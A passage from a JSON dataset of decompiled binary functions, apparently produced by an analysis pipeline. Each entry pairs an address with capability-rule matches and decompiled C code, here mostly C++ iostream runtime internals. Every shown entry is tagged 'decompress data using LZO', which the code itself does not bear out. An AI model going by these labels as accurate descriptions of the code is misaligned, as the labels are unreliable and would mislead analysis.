*(*arg_8h + -0xc) + 8) = 0;\n            goto code_r0x0049e507;\n        }\n    }\n    *(iVar10 + 8) = 0;\ncode_r0x0049e507:\n    iVar7 = *(*var_1ch + -0xc);\n    if (((((*(var_1ch + iVar7 + 0xd) & 0x20) != 0) && (cVar4 = fcn.0049e8f0(),  cVar4 == '\\0')) &&\n        (piVar2 = *(var_1ch + iVar7 + 0x78),  piVar2 != NULL)) && (iVar7 = (**(*piVar2 + 0x18))(),  iVar7 == -1)) {\n        fcn.0049ce20(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n    }\n    return arg_8h;\n}\n",
        "token_count": 1897
    },
    "0049e910": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0049e910(uint s)\n\n{\n    int32_t **ppiVar1;\n    uint *puVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint uVar5;\n    int32_t **ppiVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    int32_t **ppiVar9;\n    int32_t *piVar10;\n    int32_t *piVar11;\n    int32_t *piVar12;\n    uint *var_70h;\n    uint var_6ch;\n    uint *var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint *var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t *var_30h;\n    int32_t *var_2ch;\n    int32_t *var_28h;\n    \n    puVar2 = fcn.004a3610(0x18);\n    piVar3 = fcn.00428c80();\n    pcVar7 = *(*piVar3 + 0x10);\n    if (pcVar7 != fcn.0042b520) goto code_r0x0049eabb;\n    var_60h = &var_58h;\n    var_58h._0_1_ = 0;\n    fcn.004906f0(0, 0, \"iostream error\", 0xe);\n    do {\n        var_70h = &var_58h;\n        piVar4 = fcn.004906f0(0, 0, 0x5052fb, 2);\n        var_48h = &var_40h;\n        piVar11 = piVar4 + 2;\n        if (*piVar4 == piVar11) {\n            piVar10 = piVar11;\n            piVar12 = &var_40h;\n            for (iVar8 = 4; iVar8 != 0; iVar8 = iVar8 + -1) {\n                *piVar12 = *piVar10;\n                piVar10 = piVar10 + 1;\n                piVar12 = piVar12 + 1;\n            }\n        }\n        else {\n            var_40h = piVar4[2];\n            var_48h = *piVar4;\n        }\n        var_44h = piVar4[1];\n        *(piVar4 + 2) = 0;\n        *piVar4 = piVar11;\n        piVar4[1] = 0;\n        uVar5 = sub.msvcrt.dll_strlen(s);\n        ppiVar6 = fcn.004906f0(0, 0, s, uVar5);\n        var_30h = &var_28h;\n        ppiVar1 = ppiVar6 + 2;\n        if (*ppiVar6 == ppiVar1) {\n            ppiVar9 = ppiVar1;\n            piVar11 = var_30h;\n            for (iVar8 = 4; iVar8 != 0; iVar8 = iVar8 + -1) {\n                *piVar11 = *ppiVar9;\n                ppiVar9 = ppiVar9 + 1;\n                piVar11 = piVar11 + 1;\n            }\n        }\n        else {\n            var_28h = ppiVar6[2];\n            var_30h = *ppiVar6;\n        }\n        var_2ch = ppiVar6[1];\n        *(ppiVar6 + 2) = 0;\n        *ppiVar6 = ppiVar1;\n        ppiVar6[1] = NULL;\n        fcn.00481660(&var_30h);\n        if (var_30h != &var_28h) {\n            fcn.004a34c0(var_30h);\n        }\n        if (var_48h != &var_40h) {\n            fcn.004a34c0(var_48h);\n        }\n        if (var_60h != var_70h) {\n            fcn.004a34c0(var_60h);\n        }\n        puVar2[2] = 1;\n        *puVar2 = 0x50a960;\n        puVar2[3] = piVar3;\n        uVar5 = fcn.004306f0();\n        fcn.0049f0e0(puVar2 + 4, uVar5);\n        pcVar7 = fcn.004a3bc0(puVar2, 0x5071ec, 0x4769d0);\ncode_r0x0049eabb:\n        (*pcVar7)(piVar3, 1);\n    } while( true );\n}\n",
        "token_count": 1052
    },
    "0049eb30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0049eb30(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint extraout_ECX;\n    char unaff_DI;\n    ulong uVar6;\n    int32_t in_stack_00000020;\n    \n    iVar4 = fcn.004a3610(8);\n    fcn.0046ff10(arg_8h);\n    uVar5 = fcn.004a3bc0(iVar4, 0x507184, fcn.00470010);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    uVar6 = fcn.004a3c30();\n    if (uVar6 >> 0x20 != 1) {\n        fcn.0041b360(uVar6);\n    }\n    fcn.004a36d0();\n    fcn.004a3840();\n    uVar2 = *(iVar4 + 0x14) | 1;\n    *(iVar4 + 0x14) = uVar2;\n    if ((*(iVar4 + 0x10) & uVar2) == 0) {\n        if (unaff_DI == '\\0') {\n            *(iVar4 + 0x1c) = 0;\n        }\n        else {\n            *(iVar4 + 0x20) = 0;\n        }\n        return iVar4 + 0x1c;\n    }\n    iVar3 = fcn.0049e910(\"ios_base::_M_grow_words allocation failed\");\n    puVar1 = *(iVar4 + 0x68);\n    uVar5 = extraout_ECX;\n    if ((puVar1 != &stack0xfffffffc) && (puVar1 != NULL)) {\n        fcn.004a34b0(puVar1);\n    }\n    *(iVar4 + 0x68) = iVar3;\n    *(iVar4 + 100) = uVar5;\n    return iVar3 + in_stack_00000020 * 8;\n}\n",
        "token_count": 688
    },
    "0049eb80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0049eb80(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint extraout_ECX;\n    char unaff_DI;\n    ulong uVar6;\n    int32_t in_stack_00000020;\n    \n    iVar4 = fcn.004a3610(8);\n    fcn.004700a0(arg_8h);\n    uVar5 = fcn.004a3bc0(iVar4, 0x507190, fcn.00470150);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    uVar6 = fcn.004a3c30();\n    if (uVar6 >> 0x20 != 1) {\n        fcn.0041b360(uVar6);\n    }\n    fcn.004a36d0();\n    fcn.004a3840();\n    uVar2 = *(iVar4 + 0x14) | 1;\n    *(iVar4 + 0x14) = uVar2;\n    if ((*(iVar4 + 0x10) & uVar2) == 0) {\n        if (unaff_DI == '\\0') {\n            *(iVar4 + 0x1c) = 0;\n        }\n        else {\n            *(iVar4 + 0x20) = 0;\n        }\n        return iVar4 + 0x1c;\n    }\n    iVar3 = fcn.0049e910(\"ios_base::_M_grow_words allocation failed\");\n    puVar1 = *(iVar4 + 0x68);\n    uVar5 = extraout_ECX;\n    if ((puVar1 != &stack0xfffffffc) && (puVar1 != NULL)) {\n        fcn.004a34b0(puVar1);\n    }\n    *(iVar4 + 0x68) = iVar3;\n    *(iVar4 + 100) = uVar5;\n    return iVar3 + in_stack_00000020 * 8;\n}\n",
        "token_count": 520
    },
    "0049ebe0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0049ebe0(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint extraout_ECX;\n    char unaff_DI;\n    ulong uVar6;\n    int32_t in_stack_00000020;\n    \n    iVar4 = fcn.004a3610(8);\n    fcn.004714b0(arg_8h);\n    uVar5 = fcn.004a3bc0(iVar4, 0x5071bc, fcn.00471560);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    uVar6 = fcn.004a3c30();\n    if (uVar6 >> 0x20 != 1) {\n        fcn.0041b360(uVar6);\n    }\n    fcn.004a36d0();\n    fcn.004a3840();\n    uVar2 = *(iVar4 + 0x14) | 1;\n    *(iVar4 + 0x14) = uVar2;\n    if ((*(iVar4 + 0x10) & uVar2) == 0) {\n        if (unaff_DI == '\\0') {\n            *(iVar4 + 0x1c) = 0;\n        }\n        else {\n            *(iVar4 + 0x20) = 0;\n        }\n        return iVar4 + 0x1c;\n    }\n    iVar3 = fcn.0049e910(\"ios_base::_M_grow_words allocation failed\");\n    puVar1 = *(iVar4 + 0x68);\n    uVar5 = extraout_ECX;\n    if ((puVar1 != &stack0xfffffffc) && (puVar1 != NULL)) {\n        fcn.004a34b0(puVar1);\n    }\n    *(iVar4 + 0x68) = iVar3;\n    *(iVar4 + 100) = uVar5;\n    return iVar3 + in_stack_00000020 * 8;\n}\n",
        "token_count": 666
    },
    "0049ec30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.0049ec30(uint param_1)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint extraout_ECX;\n    char unaff_DI;\n    ulong uVar6;\n    int32_t in_stack_00000020;\n    \n    iVar4 = fcn.004a3610(8);\n    fcn.00471570(param_1);\n    uVar5 = fcn.004a3bc0(iVar4, 0x5071c8, fcn.00471620);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    uVar6 = fcn.004a3c30();\n    if (uVar6 >> 0x20 != 1) {\n        fcn.0041b360(uVar6);\n    }\n    fcn.004a36d0();\n    fcn.004a3840();\n    uVar2 = *(iVar4 + 0x14) | 1;\n    *(iVar4 + 0x14) = uVar2;\n    if ((*(iVar4 + 0x10) & uVar2) == 0) {\n        if (unaff_DI == '\\0') {\n            *(iVar4 + 0x1c) = 0;\n        }\n        else {\n            *(iVar4 + 0x20) = 0;\n        }\n        return iVar4 + 0x1c;\n    }\n    iVar3 = fcn.0049e910(\"ios_base::_M_grow_words allocation failed\");\n    puVar1 = *(iVar4 + 0x68);\n    uVar5 = extraout_ECX;\n    if ((puVar1 != &stack0xfffffffc) && (puVar1 != NULL)) {\n        fcn.004a34b0(puVar1);\n    }\n    *(iVar4 + 0x68) = iVar3;\n    *(iVar4 + 100) = uVar5;\n    return iVar3 + in_stack_00000020 * 8;\n}\n",
        "token_count": 613
    },
    "0049ec80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0049ec80(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint extraout_ECX;\n    char unaff_DI;\n    ulong uVar6;\n    int32_t in_stack_00000020;\n    \n    iVar4 = fcn.004a3610(8);\n    fcn.00471630(arg_8h);\n    uVar5 = fcn.004a3bc0(iVar4, 0x5071d4, fcn.004716e0);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    uVar6 = fcn.004a3c30();\n    if (uVar6 >> 0x20 != 1) {\n        fcn.0041b360(uVar6);\n    }\n    fcn.004a36d0();\n    fcn.004a3840();\n    uVar2 = *(iVar4 + 0x14) | 1;\n    *(iVar4 + 0x14) = uVar2;\n    if ((*(iVar4 + 0x10) & uVar2) == 0) {\n        if (unaff_DI == '\\0') {\n            *(iVar4 + 0x1c) = 0;\n        }\n        else {\n            *(iVar4 + 0x20) = 0;\n        }\n        return iVar4 + 0x1c;\n    }\n    iVar3 = fcn.0049e910(\"ios_base::_M_grow_words allocation failed\");\n    puVar1 = *(iVar4 + 0x68);\n    uVar5 = extraout_ECX;\n    if ((puVar1 != &stack0xfffffffc) && (puVar1 != NULL)) {\n        fcn.004a34b0(puVar1);\n    }\n    *(iVar4 + 0x68) = iVar3;\n    *(iVar4 + 100) = uVar5;\n    return iVar3 + in_stack_00000020 * 8;\n}\n",
        "token_count": 594
    },
    "0049ecd0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0049ecd0(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint *var_30h;\n    uint var_28h;\n    \n    puVar1 = fcn.004a3610(0x10);\n    fcn.0042b5d0(0x4f68a8, arg_8h);\n    fcn.00481660(&var_30h);\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    *puVar1 = 0x50a94c;\n    puVar1[2] = arg_8h;\n    puVar1[3] = 0x4f68a8;\n    fcn.004a3bc0(puVar1, 0x5071e0, fcn.00471710);\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    fcn.004a3910(puVar1);\n    fcn.0041b360(&var_30h);\n    fcn.004014c0(0x4a4440);\n    fcn.004014c0(0x4a4450);\n    return;\n}\n",
        "token_count": 293
    },
    "0049ed40": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.0049ed40(int32_t *param_1, int32_t *param_2, uchar *param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    int32_t iVar6;\n    uint var_14h;\n    uint var_18h;\n    \n    puVar3 = param_1[2];\n    puVar5 = param_1[3];\n    *param_3 = 1;\n    if (puVar3 < puVar5) {\n        uVar1 = *puVar3;\n    }\n    else {\n        uVar1 = (**(*param_1 + 0x24))();\n        if (uVar1 == 0xffffffff) {\n            return 0;\n        }\n        puVar5 = param_1[3];\n        puVar3 = param_1[2];\n    }\n    iVar6 = 0;\ncode_r0x0049ed70:\n    iVar4 = puVar5 - puVar3;\n    if (iVar4 < 2) goto code_r0x0049edab;\n    do {\n        iVar2 = (**(*param_2 + 0x30))(puVar3, iVar4);\n        param_1[2] = param_1[2] + iVar2;\n        iVar6 = iVar6 + iVar2;\n        if (iVar2 < iVar4) {\ncode_r0x0049ee06:\n            *param_3 = 0;\n            return iVar6;\n        }\n        while( true ) {\n            uVar1 = (**(*param_1 + 0x24))();\n            if (uVar1 == 0xffffffff) {\n                return iVar6;\n            }\n            puVar3 = param_1[2];\n            iVar4 = param_1[3] - puVar3;\n            if (1 < iVar4) break;\ncode_r0x0049edab:\n            if (param_2[5] < param_2[6]) {\n                *param_2[5] = uVar1;\n                param_2[5] = param_2[5] + 1;\n            }\n            else {\n                iVar4 = (**(*param_2 + 0x34))(uVar1 & 0xff);\n                if (iVar4 == -1) goto code_r0x0049ee06;\n            }\n            puVar5 = param_1[3];\n            iVar6 = iVar6 + 1;\n            if (param_1[2] < puVar5) {\n                puVar3 = param_1[2] + 1;\n                param_1[2] = puVar3;\n            }\n            else {\n                iVar4 = (**(*param_1 + 0x28))();\n                if (iVar4 == -1) {\n                    return iVar6;\n                }\n                puVar3 = param_1[2];\n                puVar5 = param_1[3];\n            }\n            if (puVar3 < puVar5) {\n                uVar1 = *puVar3;\n                goto code_r0x0049ed70;\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 702
    },
    "0049ee40": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.0049ee40(int32_t *param_1, int32_t *param_2, uchar *param_3)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_14h;\n    uint var_18h;\n    \n    *param_3 = 1;\n    piVar1 = param_1[2];\n    if (param_1[3] < piVar1 || param_1[3] == piVar1) {\n        iVar2 = (**(*param_1 + 0x24))();\n    }\n    else {\n        iVar2 = *piVar1;\n    }\n    iVar5 = 0;\n    do {\n        while( true ) {\n            if (iVar2 == -1) {\n                return iVar5;\n            }\n            iVar4 = param_1[3] - param_1[2];\n            if (iVar4 < 3) break;\n            iVar4 = iVar4 >> 1;\n            iVar3 = (**(*param_2 + 0x30))(param_1[2], iVar4);\n            param_1[2] = param_1[2] + iVar3 * 2;\n            iVar5 = iVar5 + iVar3;\n            if (iVar3 < iVar4) {\ncode_r0x0049ef07:\n                *param_3 = 0;\n                return iVar5;\n            }\ncode_r0x0049ee90:\n            iVar2 = (**(*param_1 + 0x24))();\n        }\n        piVar1 = param_2[5];\n        if (piVar1 < param_2[6]) {\n            *piVar1 = iVar2;\n            param_2[5] = piVar1 + 1;\n        }\n        else {\n            iVar2 = (**(*param_2 + 0x34))(iVar2);\n            if (iVar2 == -1) goto code_r0x0049ef07;\n        }\n        iVar5 = iVar5 + 1;\n        piVar1 = param_1[2];\n        if (piVar1 < param_1[3]) {\n            iVar2 = *piVar1;\n            param_1[2] = piVar1 + 1;\n        }\n        else {\n            iVar2 = (**(*param_1 + 0x28))();\n        }\n        if (iVar2 == -1) {\n            return iVar5;\n        }\n        if (param_1[3] <= param_1[2]) goto code_r0x0049ee90;\n        iVar2 = *param_1[2];\n    } while( true );\n}\n",
        "token_count": 588
    },
    "0049ef80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0049ef80(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint extraout_ECX;\n    char unaff_DI;\n    ulong uVar6;\n    int32_t in_stack_00000020;\n    \n    iVar4 = fcn.004a3610(8);\n    fcn.00481620(arg_8h);\n    uVar5 = fcn.004a3bc0(iVar4, 0x50726c, fcn.00481720);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    uVar6 = fcn.004a3c30();\n    if (uVar6 >> 0x20 != 1) {\n        fcn.0041b360(uVar6);\n    }\n    fcn.004a36d0();\n    fcn.004a3840();\n    uVar2 = *(iVar4 + 0x14) | 1;\n    *(iVar4 + 0x14) = uVar2;\n    if ((*(iVar4 + 0x10) & uVar2) == 0) {\n        if (unaff_DI == '\\0') {\n            *(iVar4 + 0x1c) = 0;\n        }\n        else {\n            *(iVar4 + 0x20) = 0;\n        }\n        return iVar4 + 0x1c;\n    }\n    iVar3 = fcn.0049e910(\"ios_base::_M_grow_words allocation failed\");\n    puVar1 = *(iVar4 + 0x68);\n    uVar5 = extraout_ECX;\n    if ((puVar1 != &stack0xfffffffc) && (puVar1 != NULL)) {\n        fcn.004a34b0(puVar1);\n    }\n    *(iVar4 + 0x68) = iVar3;\n    *(iVar4 + 100) = uVar5;\n    return iVar3 + in_stack_00000020 * 8;\n}\n",
        "token_count": 544
    },
    "0049efd0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0049efd0(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint extraout_ECX;\n    char unaff_DI;\n    ulong uVar6;\n    int32_t in_stack_00000020;\n    \n    iVar4 = fcn.004a3610(8);\n    fcn.00485a90(arg_8h);\n    uVar5 = fcn.004a3bc0(iVar4, 0x5072f8, fcn.00485b40);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    uVar6 = fcn.004a3c30();\n    if (uVar6 >> 0x20 != 1) {\n        fcn.0041b360(uVar6);\n    }\n    fcn.004a36d0();\n    fcn.004a3840();\n    uVar2 = *(iVar4 + 0x14) | 1;\n    *(iVar4 + 0x14) = uVar2;\n    if ((*(iVar4 + 0x10) & uVar2) == 0) {\n        if (unaff_DI == '\\0') {\n            *(iVar4 + 0x1c) = 0;\n        }\n        else {\n            *(iVar4 + 0x20) = 0;\n        }\n        return iVar4 + 0x1c;\n    }\n    iVar3 = fcn.0049e910(\"ios_base::_M_grow_words allocation failed\");\n    puVar1 = *(iVar4 + 0x68);\n    uVar5 = extraout_ECX;\n    if ((puVar1 != &stack0xfffffffc) && (puVar1 != NULL)) {\n        fcn.004a34b0(puVar1);\n    }\n    *(iVar4 + 0x68) = iVar3;\n    *(iVar4 + 100) = uVar5;\n    return iVar3 + in_stack_00000020 * 8;\n}\n",
        "token_count": 499
    },
    "0049f020": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nbool fcn.0049f020(int32_t param_1, int32_t param_2, char *param_3, int32_t param_4)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    bool bVar7;\n    bool bVar8;\n    \n    uVar5 = param_4 - 1;\n    uVar6 = param_2 - 1U;\n    if (uVar5 < param_2 - 1U) {\n        uVar6 = uVar5;\n    }\n    if (uVar6 == 0) {\n        bVar7 = false;\n        bVar8 = true;\n    }\n    else {\n        uVar4 = 0;\n        do {\n            pcVar2 = param_3 + uVar5;\n            uVar5 = uVar5 - 1;\n            pcVar1 = param_1 + uVar4;\n            uVar4 = uVar4 + 1;\n            bVar7 = *pcVar2 != *pcVar1;\n            if (uVar6 <= uVar4) break;\n        } while (!bVar7);\n        bVar8 = *pcVar2 == *pcVar1;\n    }\n    cVar3 = *(param_1 + uVar6);\n    if ((uVar5 != 0) && (!bVar7)) {\n        do {\n            pcVar1 = param_3 + uVar5;\n            uVar5 = uVar5 - 1;\n            if (uVar5 == 0) break;\n        } while (*pcVar1 == cVar3);\n        bVar8 = *pcVar1 == cVar3;\n    }\n    if (cVar3 - 1U < 0x7e) {\n        bVar8 = (*param_3 == cVar3 || *param_3 < cVar3) & bVar8;\n    }\n    return bVar8;\n}\n",
        "token_count": 444
    },
    "0049f0e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0049f0e0(uint param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar uStack29;\n    int32_t iStack28;\n    uchar auStack18 [2];\n    uchar auStack16 [12];\n    \n    fcn.0046d600(param_2, auStack18);\n    fcn.0049b5b0(auStack16);\n    if (*0x4f59f4 == 0) {\n        iVar2 = *(iStack28 + -4);\n        *(iStack28 + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack28 + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return;\n    }\n    fcn.0046bf60(&uStack29);\n    return;\n}\n",
        "token_count": 219
    },
    "0049f160": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0049f160(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint extraout_ECX;\n    char unaff_DI;\n    ulong uVar6;\n    int32_t in_stack_00000020;\n    \n    iVar4 = fcn.004a3610(8);\n    fcn.00487dc0(arg_8h);\n    uVar5 = fcn.004a3bc0(iVar4, 0x507374, fcn.00487e70);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    uVar6 = fcn.004a3c30();\n    if (uVar6 >> 0x20 != 1) {\n        fcn.0041b360(uVar6);\n    }\n    fcn.004a36d0();\n    fcn.004a3840();\n    uVar2 = *(iVar4 + 0x14) | 1;\n    *(iVar4 + 0x14) = uVar2;\n    if ((*(iVar4 + 0x10) & uVar2) == 0) {\n        if (unaff_DI == '\\0') {\n            *(iVar4 + 0x1c) = 0;\n        }\n        else {\n            *(iVar4 + 0x20) = 0;\n        }\n        return iVar4 + 0x1c;\n    }\n    iVar3 = fcn.0049e910(\"ios_base::_M_grow_words allocation failed\");\n    puVar1 = *(iVar4 + 0x68);\n    uVar5 = extraout_ECX;\n    if ((puVar1 != &stack0xfffffffc) && (puVar1 != NULL)) {\n        fcn.004a34b0(puVar1);\n    }\n    *(iVar4 + 0x68) = iVar3;\n    *(iVar4 + 100) = uVar5;\n    return iVar3 + in_stack_00000020 * 8;\n}\n",
        "token_count": 473
    },
    "0049f1d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0049f1d0(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint extraout_ECX;\n    char unaff_DI;\n    ulong uVar6;\n    int32_t in_stack_00000020;\n    \n    iVar4 = fcn.004a3610(8);\n    fcn.00488b90(arg_8h);\n    uVar5 = fcn.004a3bc0(iVar4, 0x507398, fcn.00488c40);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    fcn.004a3910(iVar4);\n    fcn.0041b360(uVar5);\n    uVar6 = fcn.004a3c30();\n    if (uVar6 >> 0x20 != 1) {\n        fcn.0041b360(uVar6);\n    }\n    fcn.004a36d0();\n    fcn.004a3840();\n    uVar2 = *(iVar4 + 0x14) | 1;\n    *(iVar4 + 0x14) = uVar2;\n    if ((*(iVar4 + 0x10) & uVar2) == 0) {\n        if (unaff_DI == '\\0') {\n            *(iVar4 + 0x1c) = 0;\n        }\n        else {\n            *(iVar4 + 0x20) = 0;\n        }\n        return iVar4 + 0x1c;\n    }\n    iVar3 = fcn.0049e910(\"ios_base::_M_grow_words allocation failed\");\n    puVar1 = *(iVar4 + 0x68);\n    uVar5 = extraout_ECX;\n    if ((puVar1 != &stack0xfffffffc) && (puVar1 != NULL)) {\n        fcn.004a34b0(puVar1);\n    }\n    *(iVar4 + 0x68) = iVar3;\n    *(iVar4 + 100) = uVar5;\n    return iVar3 + in_stack_00000020 * 8;\n}\n",
        "token_count": 643
    },
    "0049f220": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nint32_t __cdecl fcn.0049f220(uint s, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint extraout_ECX;\n    char unaff_DI;\n    ulong uVar7;\n    char *apcStack36 [2];\n    uint32_t uStack28;\n    code *apcStack24 [2];\n    int32_t iStack16;\n    \n    uStack28 = s;\n    apcStack36[1] = 0x49f233;\n    sub.msvcrt.dll_strlen();\n    apcStack36[1] = 0x49f249;\n    uVar7 = fcn.00418950();\n    iVar1 = -uVar7;\n    *(&stack0xffffffec + iVar1) = s;\n    *(&stack0xffffffe8 + iVar1) = uVar7 >> 0x20;\n    *(&stack0xfffffff0 + iVar1) = &fcn.0049f220::arg_ch;\n    *(&stack0xffffffe4 + iVar1) = &stack0x00000003 + iVar1 & 0xfffffff0;\n    *(&stack0xffffffe0 + iVar1) = 0x49f269;\n    fcn.00429820();\n    *(&stack0xffffffe4 + iVar1) = 8;\n    *(&stack0xffffffe0 + iVar1) = 0x49f275;\n    iVar5 = fcn.004a3610();\n    *(&stack0xffffffe4 + iVar1) = &stack0x00000003 + iVar1 & 0xfffffff0;\n    *(&stack0xffffffe0 + iVar1) = 0x49f281;\n    fcn.00471630();\n    *(&stack0xffffffe8 + iVar1) = fcn.004716e0;\n    *(&stack0xffffffe4 + iVar1) = 